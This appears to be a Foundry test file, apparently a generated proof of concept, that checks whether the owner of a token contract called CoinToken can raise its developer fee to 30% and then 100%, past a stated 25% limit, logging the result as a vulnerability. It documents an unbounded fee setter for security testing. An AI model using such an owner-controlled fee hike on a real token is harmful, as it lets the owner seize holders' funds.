// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/CoinToken.sol";

contract MockFactory {
    function createPair(address, address) external pure returns (address) {
        return address(0xBEEF);
    }
}

contract MockRouter {
    MockFactory public factory;
    address public WETH;

    constructor(address _weth) {
        factory = new MockFactory();
        WETH = _weth;
    }
}

contract CoinToken_ELFM_Test is Test {
    CoinToken token;
    address owner = address(0x1);
    address devAddress = address(0x2);
    address router;
    address weth = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    function setUp() public {
        MockRouter mockRouter = new MockRouter(weth);
        router = address(mockRouter);

        vm.startPrank(owner);
        token = new CoinToken(
            "TestToken", 
            "TT",
            18,
            1000000,   // 1M token supply
            1,         // 1% txFee
            1,         // 1% lpFee
            1,         // 1% devFee
            router,
            devAddress,
            owner
        );
        vm.stopPrank();
    }

    function testDevFeeCanExceedLimit() public {
        // Capture initial state
        uint256 initialFee = token._devFee();
        console.log("--- Set to 30% ---");
        console.log("Pre-state:  _devFee =", initialFee);

        // First attack operation: set to 30%
        vm.startPrank(owner);
        token.setDevFeePercent(30);
        vm.stopPrank();
        
        // Capture state after first attack
        uint256 feeAfterFirstSet = token._devFee();
        console.log("Post-state: _devFee =", feeAfterFirstSet);
        console.log("----------------------");
        
        console.log("--- Set to 100% ---");
        console.log("Pre-state:  _devFee =", feeAfterFirstSet);
        
        // Second attack operation: set to 100%
        vm.startPrank(owner);
        token.setDevFeePercent(100);
        vm.stopPrank();
        
        // Capture state after second attack
        uint256 finalFee = token._devFee();
        console.log("Post-state: _devFee =", finalFee);
        console.log("----------------------");
        
        // Vulnerability determination
        bool vulnerabilityExists = finalFee > 25;
        
        if (vulnerabilityExists) {
            console.log("Vulfiller: Vulnerability confirmed - fee exceeds 25%% limit");
            console.log("Vulnerability Exists: Dev fee can be set to %s%, exceeding the 25%% limit", finalFee);
        } else {
            console.log("Vulfiller: Fee limit respected, no vulnerability detected");
            console.log("Vulnerability not Exist: Final dev fee (%s%) respects 25%% limit", finalFee);
        }
    }
}